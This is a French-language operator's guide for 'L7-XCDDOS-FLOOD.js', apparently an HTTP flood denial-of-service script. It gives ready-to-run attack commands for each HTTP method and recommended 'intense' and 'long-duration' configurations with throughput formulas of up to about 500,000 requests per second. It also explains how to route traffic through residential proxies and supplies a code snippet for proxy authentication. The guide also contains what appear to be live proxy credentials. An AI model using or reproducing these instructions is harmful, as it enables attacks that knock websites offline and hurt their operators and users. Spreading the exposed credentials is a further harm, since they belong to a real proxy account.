# Guide d'utilisation - L7-XCDDOS-FLOOD.js

## 📁 Fichier Proxy

### Format du fichier `proxies.txt`
Le script attend un fichier avec le format `IP:PORT` (une ligne par proxy).

**Fichier : `proxies.txt`**
```
geo.iproyal.com:12321
```

### ⚠️ Note sur l'authentification
Le script actuel ne gère pas directement l'authentification proxy dans le fichier. Pour utiliser un proxy avec login/pass, vous avez deux options :

**Option 1 : Modifier le script** (recommandé)
Ajouter l'authentification dans la fonction `HTTP()` du script.

**Option 2 : Utiliser le format user:pass@ip:port** (si supporté)
```
fa6woTeBNjLAF6En:PjukuUhi8DLXx848_country-fr@geo.iproyal.com:12321
```

---

## 🚀 Commandes d'utilisation

### Syntaxe générale
```bash
node L7-XCDDOS-FLOOD.js <host> <time> <req> <thread> <proxy.txt> <data>
```

### Paramètres
- **host** : URL complète de la cible (https://example.com)
- **time** : Durée de l'attaque en secondes
- **req** : Nombre de requêtes par interval (500ms)
- **thread** : Nombre de workers/threads (utilise les CPU cores)
- **proxy.txt** : Nom du fichier contenant les proxies
- **data** : Méthode HTTP (GET, POST, HEAD, OPTIONS, etc.)

---

## 📋 Exemples de commandes par méthode HTTP

### 1. Attaque GET (Standard)
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt GET
```
- Durée : 60 secondes
- Taux : 1000 requêtes/500ms = 2000 req/s par thread
- Threads : 50 workers
- Méthode : GET

### 2. Attaque POST
```bash
node L7-XCDDOS-FLOOD.js https://example.com 120 2000 50 proxies.txt POST
```
- Durée : 120 secondes (2 minutes)
- Taux : 2000 requêtes/500ms = 4000 req/s par thread
- Threads : 50 workers
- Méthode : POST

### 3. Attaque HEAD (Léger)
```bash
node L7-XCDDOS-FLOOD.js https://example.com 300 5000 50 proxies.txt HEAD
```
- Durée : 300 secondes (5 minutes)
- Taux : 5000 requêtes/500ms = 10000 req/s par thread
- Threads : 50 workers
- Méthode : HEAD (pas de body, plus rapide)

### 4. Attaque OPTIONS
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1500 50 proxies.txt OPTIONS
```

### 5. Attaque PUT
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt PUT
```

### 6. Attaque DELETE
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt DELETE
```

### 7. Attaque PATCH
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 50 proxies.txt PATCH
```

---

## 🎯 Configurations recommandées

### Attaque courte et intense
```bash
node L7-XCDDOS-FLOOD.js https://target.com 30 5000 50 proxies.txt GET
```
- 30 secondes
- 5000 req/interval = 10,000 req/s par thread
- Total : ~500,000 req/s (50 threads)

### Attaque longue durée
```bash
node L7-XCDDOS-FLOOD.js https://target.com 3600 1000 50 proxies.txt GET
```
- 3600 secondes (1 heure)
- 1000 req/interval = 2000 req/s par thread
- Total : ~100,000 req/s (50 threads)

### Attaque modérée (recommandée)
```bash
node L7-XCDDOS-FLOOD.js https://target.com 300 2000 50 proxies.txt GET
```
- 300 secondes (5 minutes)
- 2000 req/interval = 4000 req/s par thread
- Total : ~200,000 req/s (50 threads)

---

## 📊 Calcul de la puissance

**Formule :**
```
RPS total = (req / 0.5) × threads
```

**Exemples :**
- `req=1000, threads=50` → `(1000/0.5) × 50 = 100,000 RPS`
- `req=2000, threads=50` → `(2000/0.5) × 50 = 200,000 RPS`
- `req=5000, threads=50` → `(5000/0.5) × 50 = 500,000 RPS`

---

## 🔧 Configuration pour votre serveur (12 CPU / 32 GB RAM)

### Optimale
```bash
node L7-XCDDOS-FLOOD.js https://target.com 300 3000 12 proxies.txt GET
```
- Utilise les 12 CPU cores
- 3000 req/interval = 6000 req/s par thread
- Total : ~72,000 RPS

### Maximale (attention à la charge)
```bash
node L7-XCDDOS-FLOOD.js https://target.com 300 5000 12 proxies.txt GET
```
- Total : ~120,000 RPS
- ⚠️ Surveillez CPU/RAM

---

## 📝 Fichier proxy avec authentification

Si vous devez utiliser l'authentification, créez `proxies.txt` :

**Format simple (si le script le supporte) :**
```
fa6woTeBNjLAF6En:PjukuUhi8DLXx848_country-fr@geo.iproyal.com:12321
```

**Format standard (actuel) :**
```
geo.iproyal.com:12321
```

**Note :** Le script actuel ne gère pas l'authentification dans le fichier. Il faudrait modifier la fonction `HTTP()` pour ajouter :
```javascript
const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\n" +
                "Host: " + options.address + ":443\r\n" +
                "Proxy-Authorization: Basic " + Buffer.from(user + ":" + pass).toString('base64') + "\r\n" +
                "Connection: Keep-Alive\r\n\r\n";
```

---

## 🛠️ Commandes pratiques

### Créer le fichier proxy
```bash
echo "geo.iproyal.com:12321" > proxies.txt
```

### Vérifier le fichier
```bash
cat proxies.txt
```

### Lancer une attaque
```bash
node L7-XCDDOS-FLOOD.js https://example.com 60 1000 12 proxies.txt GET
```

### Arrêter l'attaque
```bash
pkill -f "L7-XCDDOS-FLOOD.js"
```

---

## ⚠️ Notes importantes

1. **Proxy avec auth** : Le script actuel ne gère pas l'authentification. Il faudra le modifier.
2. **Fichier proxy** : Un proxy par ligne, format `IP:PORT`
3. **Threads** : Ne dépassez pas le nombre de CPU cores pour de meilleures performances
4. **Rate** : Commencez bas (1000) et augmentez progressivement
5. **Monitoring** : Surveillez CPU/RAM avec `htop` ou `top`

---

## 📈 Toutes les méthodes HTTP disponibles

- **GET** - Requête standard
- **POST** - Envoi de données
- **HEAD** - Sans body (plus rapide)
- **OPTIONS** - Informations sur le serveur
- **PUT** - Mise à jour
- **DELETE** - Suppression
- **PATCH** - Modification partielle
- **TRACE** - Diagnostic
- **CONNECT** - Tunnel proxy

